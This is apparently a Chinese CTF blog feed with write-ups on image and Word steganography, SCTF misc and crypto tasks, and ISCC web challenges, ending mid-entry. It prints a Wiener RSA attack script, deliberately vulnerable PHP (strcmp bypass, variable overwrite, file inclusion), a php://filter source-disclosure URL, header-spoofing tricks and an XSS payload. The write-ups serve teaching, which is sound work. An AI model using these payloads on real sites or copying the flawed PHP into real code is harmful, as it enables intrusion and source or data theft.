    <content type="html"><![CDATA[<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><blockquote><p>安恒杯月赛</p></blockquote><p>题目提示浏览图片的时候能不能F5刷新呢？</p><ol><li>GitHub上的现成工具：git clone <a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="external">https://github.com/matthewgao/F5-steganography</a></li><li>进入F5_steganography目录 java Extract 图片文件路径 -p password<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189155771.png" alt="Alt text"></li></ol><p>然后会出现一个flag.txt但是打开为乱码<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189279386.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189344861.png" alt="Alt text"><br>看文件头是zip 看后缀名解压拿flag<br>flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="xor隐写"><a href="#xor隐写" class="headerlink" title="xor隐写"></a>xor隐写</h3><blockquote><p>巅峰极客 loli</p></blockquote><p>hint:0xFF 想到用0xFF异或整个文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</div><div class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</div><div class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    xor()</div></pre></td></tr></table></figure></p><p>得到新的png文件，用hex看文件有提示<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532268180784.png" alt="Alt text"><br>将png分离出来可以用foremost或者直接修改16进制文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/00006777.png" alt="Alt text"><br>观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。<br>提取信息<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg</div><div class="line"></div><div class="line">res_str = []</div><div class="line">res = []</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpng</span><span class="params">()</span>:</span></div><div class="line">    png = mpimg.imread(<span class="string">'./00006777.png'</span>)</div><div class="line">    yy, xx, depth = png.shape</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(yy):</div><div class="line">        <span class="keyword">if</span> y % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, xx - <span class="number">1</span>, <span class="number">9</span>):</div><div class="line">                _str = <span class="string">"0b"</span> + str(int(png[y][x][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">1</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">2</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">3</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">4</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">5</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">6</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">7</span>][<span class="number">0</span>]))</div><div class="line">                res_str.append(_str)</div><div class="line">                res.append(bin2hex(_str))</div><div class="line">    <span class="keyword">print</span> res_str</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'res.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> res:</div><div class="line">            f.write(chr(each))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(_bin=<span class="string">"0b101"</span>)</span>:</span></div><div class="line">    <span class="keyword">return</span> int(_bin, <span class="number">2</span>) ^ <span class="number">0xFF</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    readpng()</div></pre></td></tr></table></figure></p><p>打开就能看到flag<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272225449.png" alt="Alt text"><br>flag{e0754197-e3ab-4d0d-b98f-96174c378a34}</p><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><blockquote><p>巅峰极客 warmup</p></blockquote><p>判断方法大概就是用Stegsolve打开看red plane 0,blue plane 0, green plane 0是不是大致相同，如果是那多半是LSB隐写</p><p>分别提取红绿蓝三个通道的最低位<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272546074.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272557239.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272567977.png" alt="Alt text"><br>分别是ook 和brainfuck编码 然后解码拼一起就完事<br>flag{db640436-7839-4050-8339-75a972fc553c}</p><blockquote><p>安恒月赛 女神</p></blockquote><p>题目提示弱口令，会误以为压缩包密码为弱口令，结果是隐写口令为弱口令</p><p>打开压缩包发现有密码，旁边有备注<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352386718.png" alt="Alt text"><br>复制备注到sublime，发现是tab和空格，于是猜测为摩斯码，空格为点，tab为横线<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352479146.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352490146.png" alt="Alt text"><br>解码得到密码，解压后得到图片，用Stegoslove分析应该是LSB隐写，用cloacked-pixel解出flag，密码为弱口令<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532440300026.png" alt="Alt text"><br>flag{jsy09-wytg5-wius8}</p><h3 id="反色二维码"><a href="#反色二维码" class="headerlink" title="反色二维码"></a>反色二维码</h3><p>有些简单题目用stegsolve就能出二维码不过是反色的<br>比如这种</p><blockquote><p>whalectf Find<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401924732.png" alt="Alt text"></p></blockquote><p>这时候发送到QQ上点击选中就可以扫了<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401973178.png" alt="Alt text"></p><h2 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h2><p>第一种是在word内容里隐藏文字<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368015116.png" alt="Alt text"><br>勾选上隐藏文字就可以看到隐写内容。<br>当然也有把文字颜色改为和背景色一样的，还有用图片覆盖的。</p><p>第二种是在xml文件中隐藏<br>用binwalk查看文件或者将文件后缀名改为zip可以解压出xml文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368372808.png" alt="Alt text"></p><p>未完待添加。。。。。。</p><h2 id="上述题目文件链接"><a href="#上述题目文件链接" class="headerlink" title="上述题目文件链接"></a>上述题目文件链接</h2><p>链接：<a href="https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g" target="_blank" rel="external">https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g</a> 密码：7r3s</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;图片隐写&quot;&gt;&lt;a href=&quot;#图片隐写&quot; class=&quot;headerlink&quot; title=&quot;图片隐写&quot;&gt;&lt;/a&gt;图片隐写&lt;/h2&gt;&lt;h3 id=&quot;F5隐写&quot;&gt;&lt;a href=&quot;#F5隐写&quot; class=&quot;headerlink&quot; title=&quot;F5隐写&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SCTF writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/15/SCTF-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/15/SCTF-writeup/</id>
    <published>2018-07-14T17:25:28.000Z</published>
    <updated>2018-08-02T17:32:12.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>根据提示用侧信道简单能量分析攻击 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="/2018/07/15/SCTF-writeup/1529508947239.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529510158298.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529508876165.png" alt="Alt text"><br>因为不知道哪个是0哪个是1 然后试了一下</p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="/2018/07/15/SCTF-writeup/1529509226841.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529509154812.png" alt="Alt text"></p><p>按照网上一道类似题的分析，找TCP/IP协议502,102端口<br>追踪TCP流</p><p>SCTF{Easy_Mdbus}</p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>百度找到看雪的一篇分析文章<br>logicdata拖进Logic里面,分析嗅探得到的波形图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x33 0x01 s1</div><div class="line">0x33 0x02 s2</div><div class="line">0x33 0x03 s3</div></pre></td></tr></table></figure></p><p>读出s1, s2, s3</p><p><img src="/2018/07/15/SCTF-writeup/1529509388163.png" alt="Alt text"></p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>用爱奇艺可以拖flash  然后直接拖到最后看了几遍什么都没发现 然后往前翻 发现中间有个过程动画(大概57那里)与那个boss对话中有段base64 解码<br><img src="/2018/07/15/SCTF-writeup/1529509923703.png" alt="Alt text"></p><p><img src="/2018/07/15/SCTF-writeup/1529509417432.png" alt="Alt text"></p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>给出了n, e, c  求m<br>首先尝试了一下分解n,结果太大分解不出来<br><img src="/2018/07/15/SCTF-writeup/1529509597682.png" alt="Alt text"><br>看了一下RSA相关文章 用低解密指数攻击<br><strong>特征：e看起来非常大</strong><br>github 上有RSAwienerHacker 直接下下来跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line"><span class="string">    Finds d knowing (e,n)</span></div><div class="line"><span class="string">    applying the Wiener continued fraction attack</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</div><div class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</div><div class="line">        </div><div class="line">        <span class="comment">#check if d is actually the key</span></div><div class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</div><div class="line">            phi = (e*d<span class="number">-1</span>)//k</div><div class="line">            s = n - phi + <span class="number">1</span></div><div class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></div><div class="line">            <span class="comment"># has integer roots</span></div><div class="line">            discr = s*s - <span class="number">4</span>*n</div><div class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</div><div class="line">                t = Arithmetic.is_perfect_square(discr)</div><div class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">                    print(<span class="string">"Hacked!"</span>)</div><div class="line">                    <span class="keyword">return</span> d</div><div class="line"></div><div class="line"><span class="comment"># TEST functions</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_hack_RSA</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"Testing Wiener Attack"</span>)</div><div class="line">    times = <span class="number">5</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span>(times&gt;<span class="number">0</span>):</div><div class="line"></div><div class="line"></div><div class="line">        e,n,d = RSAvulnerableKeyGenerator.generateKeys(<span class="number">1024</span>)</div><div class="line">        print(<span class="string">"(e,n) is ("</span>, e, <span class="string">", "</span>, n, <span class="string">")"</span>)</div><div class="line">        print(<span class="string">"d = "</span>, d)</div><div class="line">    </div><div class="line">        hacked_d = hack_RSA(e, n)</div><div class="line">    </div><div class="line">        <span class="keyword">if</span> d == hacked_d:</div><div class="line">            print(<span class="string">"Hack WORKED!"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(<span class="string">"Hack FAILED"</span>)</div><div class="line">        </div><div class="line">        print(<span class="string">"d = "</span>, d, <span class="string">", hacked_d = "</span>, hacked_d)</div><div class="line">        print(<span class="string">"-------------------------"</span>)</div><div class="line">        times -= <span class="number">1</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="comment">#test_is_perfect_square()</span></div><div class="line">    <span class="comment">#print("-------------------------")</span></div><div class="line">    test_hack_RSA()</div><div class="line"></div><div class="line">n = <span class="number">356096033429997161372356441930246707554046995590506452306084931488519008238592151695866774341246347160182054216879883209187019942641996111166252052256475412435016177136773967956292472785118669272929844214105480922945372638910276569650465033695573697459823872295312452877368652943145314840314022954151337366463</span></div><div class="line">e = <span class="number">160222447153262895889250928158012827757109871196102040037421857250766491575699886894325697077956068896677359953037375582060511979328323570880578946073240834317364119936983046746942944368567355131867682895196198904859001202051459879133425754080440276218324680838480108302184726980362910704693149535052743526713</span></div><div class="line">c = <span class="number">147196512678165362278479859274730376684762864061315836792770099383278172248558388764516679102190414689292831454764081139184450400390951627813402530351267384900672105846731222258018693047922255488857215383862135296386187138430843389538652580147662346075434257219061071710799682137566072656776621262987516040147</span></div><div class="line">d = hack_RSA(e, n)</div><div class="line">print(d)</div><div class="line">m = pow(c, d, n)</div><div class="line">print(m)</div><div class="line">print(<span class="string">'%#x'</span>%m)</div></pre></td></tr></table></figure></p><p><img src="/2018/07/15/SCTF-writeup/1529509732002.png" alt="Alt text"><br>提交十进制十六进制都不对，转一下十六进制<br><img src="/2018/07/15/SCTF-writeup/1529509833971.png" alt="Alt text"><br>get flag</p><blockquote><p>贴个官方WP</p></blockquote><p><a href="https://www.xctf.org.cn//media/infoattach/38405dd3f67e4d3e93c5d5042ff14909.pdf" target="_blank" rel="external">SCTF官方WP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h2&gt;&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ISCC writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/01/ISCC-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/01/ISCC-writeup/</id>
    <published>2018-07-01T09:45:32.000Z</published>
    <updated>2018-08-02T17:26:16.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC-WP"><a href="#ISCC-WP" class="headerlink" title="ISCC WP"></a>ISCC WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>图片隐写给了一张这个图<br><img src="/2018/07/01/ISCC-writeup/1525678030342.png" alt="Alt text"></p><p>然后看手指指的地方应该就是flag  改高度<br><img src="/2018/07/01/ISCC-writeup/1525678281836.png" alt="Alt text"></p><p>IHDR后的前八个字节为宽度（第二排00 00 02 72），接下来八个为高度，将高度改为和宽度一样得到flag<br><img src="/2018/07/01/ISCC-writeup/WhatIsThat1.png" alt="Alt text"></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>给了一个txt内容是：<br>秘密电报：<br>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA<br>刚开始以为是摩斯密码结果没有分割符，直接复制百度，是培根密码然后在线解密得到flag</p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。<br>一看题目肯定有凯撒密码，移位13得到roqtp697t95j3，然后是学会使用键盘，应该是键盘加密，刚开始以为是围成什么图案或者是围起来的字母，后面发现按键盘往下移一排就是flag<br>得到flag:yougotme</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>前端代码控制的直接浏览器改一下<strong>maxlength</strong>就好了，客户端的限制一般都很好过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">maxlength</span>=<span class="string">"3"</span> <span class="attr">name</span>=<span class="string">"v"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></div></pre></td></tr></table></figure></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">'2.php'</span>);</div><div class="line">$flag=<span class="string">'&#123;***************&#125;'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;  </div><div class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)  </div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>PHP的strcmp漏洞，另一篇博客里面有，传个数组就可以get flag<br><img src="/2018/07/01/ISCC-writeup/1525692789515.png" alt="Alt text"></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><img src="/2018/07/01/ISCC-writeup/1525692860618.png" alt="Alt text"><br>burp抓包改一下XFW或者HOST就可以了</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><img src="/2018/07/01/ISCC-writeup/1525693740896.png" alt="Alt text"><br>callback的后面有一串url和base64的编码，把base64那部分解码出来<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA</div><div class="line"> &lt;script&gt;alert(<span class="string">"key:/%nsfocusXSStest%/"</span>)&lt;<span class="regexp">/scrip</span></div></pre></td></tr></table></figure></p><p>中间的key部分就是答案，我还一直在那里测xss测了半天，没想到这么坑，而且提交的时候只用key冒号后面的内容<br><img src="/2018/07/01/ISCC-writeup/1525693998162.png" alt="Alt text"></p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>Tip：好像有个文件忘记删了<br>可以想到是后台文件没删或者源码泄露，扫了下后台，试了下svn都没收获。然后py了一下原来是没删txt文件，直接输入<a href="http://118.190.152.202:8009/index.php.txt就可以读源码了" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt就可以读源码了</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</div><div class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</div><div class="line"><span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">$$k = $$v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">$$k = $v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</div><div class="line"><span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">die</span>($_200);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span>()是数组的迭代方法</div><div class="line"><span class="keyword">foreach</span>(array_expression <span class="keyword">as</span> $key =&gt; $value)每次循环中键值也会赋给$key</div></pre></td></tr></table></figure><p>分析源码，$flag应该是flag.php中的变量就是所找的答案，而最后的一个if语句执行判断，POSTflag后echo出flag，可以通过foreach的变量覆盖绕过，而要得到flag就需要从另一个输出点输出原本的flag变量。</p><p>为了方便理解我们在本地修改源码将变量值打印出来</p><p>payload1：<br><img src="/2018/07/01/ISCC-writeup/1525847512296.png" alt="Alt text"><br>可以看出第一个foreach里将<strong>\$flag</strong>的值赋给了<strong>\$_200</strong>，第二个foreach将上传的flag值赋给<strong>\$flag</strong>，从而通过后面的if判断，然后<strong>die(\$_200)</strong>输出flag内容。<br>payload2:<br><img src="/2018/07/01/ISCC-writeup/1525849178524.png" alt="Alt text"><br>第二种将<strong>\$flag</strong>的值赋给了<strong>\$_403</strong>，同时给<strong>\$_POST</strong>赋一个值使if判断成立输出<strong>\$_403</strong>，如果只给403赋值的话效果如下<br><img src="/2018/07/01/ISCC-writeup/1525849330422.png" alt="Alt text"></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><img src="/2018/07/01/ISCC-writeup/1525694416084.png" alt="Alt text"><br>刚开始看到ID以为是SQL注入，看到<strong>f=articles</strong>才反应过来读取本地文件应该是文件包含吧（之后应该找个时间总结一下文件包含和php伪协议，挖坑ing）<br>然后用php://协议<br>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</div><div class="line"># payload</div><div class="line">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=1</div></pre></td></tr></table></figure></p><p><img src="/2018/07/01/ISCC-writeup/1525694700020.png" alt="Alt text"><br>然后base64解码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html lang=&quot;en&quot;&gt; </div><div class="line">&lt;head&gt;</div><div class="line">     &lt;title&gt;?????????&lt;/title&gt;</div><div class="line">          &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt;</div><div class="line">     &lt;a href=&apos;index.php?f=articles&amp;id=1&apos;&gt;ID: 1&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=2&apos;&gt;ID: 2&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=3&apos;&gt;ID: 3&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=4&apos;&gt;ID: 4&lt;/href&gt;     &lt;/br&gt; &lt;/body&gt; &lt;/html&gt;  </div><div class="line"></div><div class="line">&lt;?php     #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;     </div><div class="line">if(isset($_GET[&apos;f&apos;]))&#123;         </div><div class="line">if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</div><div class="line">             die(&quot;error...&quot;);</div><div class="line">&#125;         </div><div class="line">else&#123;             </div><div class="line">include($_GET[&apos;f&apos;] . &apos;.php&apos;);</div><div class="line">&#125;     </div><div class="line">&#125;      </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="/2018/07/01/ISCC-writeup/1525694803250.png" alt="Alt text"><br>跟前面的一道比较类似吧，不过这道加<strong>X-Forward-For</strong>似乎没有用，加了<strong>client-ip</strong>后得到flag<br><img src="/2018/07/01/ISCC-writeup/1525694876173.png" alt="Alt text"></p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>按提示随便传个用户名和密码<br><img 